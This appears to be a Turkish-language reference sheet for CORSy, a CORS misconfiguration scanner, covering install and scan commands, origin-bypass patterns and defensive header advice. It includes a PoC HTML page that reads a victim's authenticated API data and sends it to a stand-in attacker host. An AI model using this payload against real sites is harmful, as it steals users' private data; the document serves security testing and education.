# 🌐 CORSy - Kapsamlı Başvuru Rehberi (Cheatsheet)

[🇺🇸 English Version](../README.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
   Cross-Origin Resource Sharing (CORS) Yanlış Yapılandırma Tarayıcısı
```

<p align="center">
  <img src="https://img.shields.io/badge/CORSy-CORS_Tarayıcı-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Yazar-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Kategori-Web_Güvenliği_&_API-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/Lisans-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p align="center">
  <b>🌐 Web uygulamalarında ve API'lerde Cross-Origin Resource Sharing (CORS) hatalı yapılandırmalarını tespit eden ve veri çalma risklerini analiz eden Python CLI aracı</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış ve CORS Zafiyeti Mantığı](#-genel-bakış-ve-cors-zafiyeti-mantığı)
  - [Ölümcül Üçlü: Origin Yansıtma + Credentials: true](#ölümcül-üçlü-origin-yansıtma--credentials-true)
- [Kurulum](#-kurulum)
- [Temel Hedef Taraması](#-temel-hedef-taraması)
- [Test Edilen CORS Saldırı Vektörleri](#-test-edilen-cors-saldırı-vektörleri)
  - [Rastgele Origin Yansıtma (Reflection)](#rastgele-origin-yansıtma-reflection)
  - [Null Origin Güveni (`Origin: null`)](#null-origin-güveni-origin-null)
  - [Önek ve Sonek Regex Baypasları](#önek-ve-sonek-regex-baypasları)
  - [Joker Alt Alan Adı (Subdomain) Güveni](#joker-alt-alan-adı-subdomain-güveni)
  - [Özel Karakter Baypası (`_`, `;`, `!`)](#özel-karakter-baypası----)
- [Çoklu Hedef Taraması ve Dışa Aktarma](#-çoklu-hedef-taraması-ve-dışa-aktarma)
- [Proof-of-Concept (PoC) HTML İstismar Kodu](#-proof-of-concept-poc-html-i̇stismar-kodu)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Yöntemleri ve Güvenli Başlıklar](#-savunma-yöntemleri-ve-güvenli-başlıklar)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış ve CORS Zafiyeti Mantığı

**Cross-Origin Resource Sharing (CORS)**, tarayıcıların varsayılan **Aynı Köken İlkesini (Same-Origin Policy - SOP)** esnetmek için kullandığı mekanizmadır. Web sunucusu şu HTTP yanıt başlıklarını döndürdüğünde:
- `Access-Control-Allow-Origin: <origin>`
- `Access-Control-Allow-Credentials: true`

Belirtilen kökene kurban kullanıcının tarayıcısı üzerinden dönen yanıtı (JSON, özel veriler vb.) okuma yetkisi verir.

### Ölümcül Üçlü: Origin Yansıtma + Credentials: true
Eğer sunucu gelen `Origin` başlığını aynen alıp `Access-Control-Allow-Origin` başlığına yazıyor ve üzerine `Allow-Credentials: true` bayrağını veriyorsa; saldırganın sitesini ziyaret eden herhangi bir kullanıcının kimlik doğrulanmış verileri (özel mesajlar, API anahtarları, faturalar) saldırgan tarafından okunabilir.

**Somdev Sangwan (s0md3v)** tarafından yazılan **CORSy**, 16'dan fazla farklı köken permutasyonu göndererek bu açıkları saniyeler içinde yakalar.

---

## 📥 Kurulum

```bash
# Depoyu klonlama
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Bağımlılıkları yükleme
pip install -r requirements.txt

# Çalıştırma
python3 corsy.py -h
```

---

## 🚀 Temel Hedef Taraması

Tek bir API uç noktasını tarama:

```bash
python3 corsy.py -u https://hedef.com/api/user/details
```

Oturum çerezi veya özel başlık ekleyerek tarama:
```bash
python3 corsy.py -u https://hedef.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```

---

## ⚡ Test Edilen CORS Saldırı Vektörleri

CORSy otomatik olarak şu saldırı kalıplarını doğrular:

### Rastgele Origin Yansıtma (Reflection)
Sunucu gönderilen herhangi bir alan adını körü körüne yansıtır:
```http
İstek:
Origin: https://saldirgan.com

Yanıt:
Access-Control-Allow-Origin: https://saldirgan.com
Access-Control-Allow-Credentials: true
```

### Null Origin Güveni (`Origin: null`)
Uygulama `null` kökenine güvenir (yerel iframe veya `data:` URL'lerinde yaygındır):
```http
İstek:
Origin: null

Yanıt:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Saldırgan sitesinde `<iframe sandbox="allow-scripts allow-top-navigation">` kullanarak `null` kökeniyle istek atabilir.*

### Önek ve Sonek Regex Baypasları
Hatalı regex kontrolleri (ör. `.*hedef.com`):
- `https://hedef.com.saldirgan.com`
- `https://sahte-hedef.com`

### Özel Karakter Baypası (`_`, `;`, `!`)
Tarayıcılar ve web sunucuları URI ayrıştırıcılarını farklı yorumlayabilir:
- `https://hedef.com_.saldirgan.com`
- `https://hedef.com%60.saldirgan.com`

---

## 🌐 Çoklu Hedef Taraması ve Dışa Aktarma

Keşif aşamasında toplanan URL listelerini topluca tarama:

```bash
# 10 iş parçacığıyla URL listesini tara
python3 corsy.py -i hedefler.txt -t 10

# Sonuçları JSON olarak dışa aktar
python3 corsy.py -i hedefler.txt -o cors_sonuclari.json
```

---

## 💻 Proof-of-Concept (PoC) HTML İstismar Kodu

CORSy kimlik bilgisi izinli bir açık bulduğunda, kurban verilerini çalmak için PoC HTML dosyası oluşturulabilir:

```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS İstismar Demosu</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Çalınan özel yanıtı saldırgan sunucusuna aktar
        fetch("https://saldirgan.com/log?veri=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://hedef.com/api/user/private_data", true);
    req.withCredentials = true; // Oturum çerezlerinin gönderilmesini sağlar
    req.send();
</script>
</body>
</html>
```

---

## ⚡ Hızlı Referans Tablosu

| Amaç | Komut |
|------|-------|
| **Tek Hedef Tara** | `python3 corsy.py -u <URL>` |
| **Oturum Çereziyle Tara** | `python3 corsy.py -u <URL> --headers "Cookie: a=b"` |
| **Dosyadan Liste Tara** | `python3 corsy.py -i hedefler.txt` |
| **Çoklu İş Parçacığı (Thread)** | `python3 corsy.py -i hedefler.txt -t 20` |
| **JSON Olarak Kaydet** | `python3 corsy.py -i hedefler.txt -o sonuclar.json` |

---

## 🛡️ Savunma Yöntemleri ve Güvenli Başlıklar

1. **Origin Başlığını Körce Yansıtmayın:** Gelen kökeni sunucu tarafında katı ve açık bir izin listesiyle (whitelist) karşılaştırın.
2. **Wildcard (`*`) ile Credentials Birlikte Kullanılamaz:** Tarayıcılar `Origin: *` ile `Credentials: true` ikilisini engeller; bunu sunucu tarafında dinamik yansıtarak taklit etmeyin.
3. **`null` Değerine Güvenmeyin:** İzinli kökenler arasına `null` eklemeyin.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> CORSy yalnızca yetkili güvenlik testleri, zafiyet araştırmaları ve denetimler için kullanılmalıdır. İzin alınmamış sitelerde tarama yapmak suç teşkil edebilir.
